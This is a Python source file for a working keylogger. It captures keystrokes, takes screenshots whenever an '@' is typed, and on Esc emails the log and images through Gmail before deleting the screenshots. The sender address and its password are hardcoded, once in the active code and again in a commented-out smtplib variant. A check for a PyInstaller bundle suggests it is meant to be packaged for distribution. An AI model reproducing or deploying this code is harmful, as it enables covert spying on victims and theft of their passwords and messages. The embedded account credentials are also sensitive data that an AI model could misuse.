from pynput.keyboard import Key, Listener
from datetime import datetime
import smtplib, ssl, email
import yagmail, os
import pyscreenshot as pic

import sys
if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
	print('running in a PyInstaller bundle')
else:
	print('running in a normal Python process')

counter = 0
test = []
pics = []
text = ""


def on_press(key):
	global test, text
	print(key)
	if key == Key.space: text = text + " "
	if key == Key.enter or key == Key.esc:
		test.append(text)
		text = ''
	k = str(key)
	if k.find("Key") == -1: text = text + str(key)
	if k.find("@") > 0:
		time = datetime.now().strftime('%d-%m-%Y - %H-%M-%S')
		test.append(time)
		bild = pic.grab()
		pics.append(str(time) + ".png")
		bild.save(str(time) + ".png")


# counter += 1
# print('alphanumeric key {0} pressed'.format(key))


def on_release(key):
	if key == Key.esc:
		msg = ""
		# Stop listener
		for hej in test:
			k = str(hej).replace("'", "")
			k += '\n'
			msg += k
			print(k)

		send_email(str(msg))
		return False


def send_email(msg: str):
	global pics
	receiver = "johscar8848@gmail.com"
	filename = "bild.png"
	# yagmail.register("johscar8848@gmail.com", "")
	yag = yagmail.SMTP("johscar8848@gmail.com", "jocke1992")
	yag.send(to=receiver, subject="Test", contents=msg, attachments=pics)
	for pic in pics:
		os.remove(pic)

	pics = []


# def send_email(msg: str):
# 	port = 587
# 	smtp_server = "smtp.gmail.com"
# 	sender_email = "johscar8848@gmail.com"
# 	receiver_email = "johscar8848@gmail.com"
# 	password = "jocke1992"
# 	message = msg

# 	context = ssl.create_default_context()
# 	with smtplib.SMTP(smtp_server, port) as server:
# 		server.ehlo()  # Can be omitted
# 		server.starttls(context=context)
# 		server.ehlo()  # Can be omitted
# 		server.login(sender_email, password)
# 		server.sendmail(sender_email, receiver_email, message)

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()

# asdsadsadsad
# savedsa
# hej@johan@se hej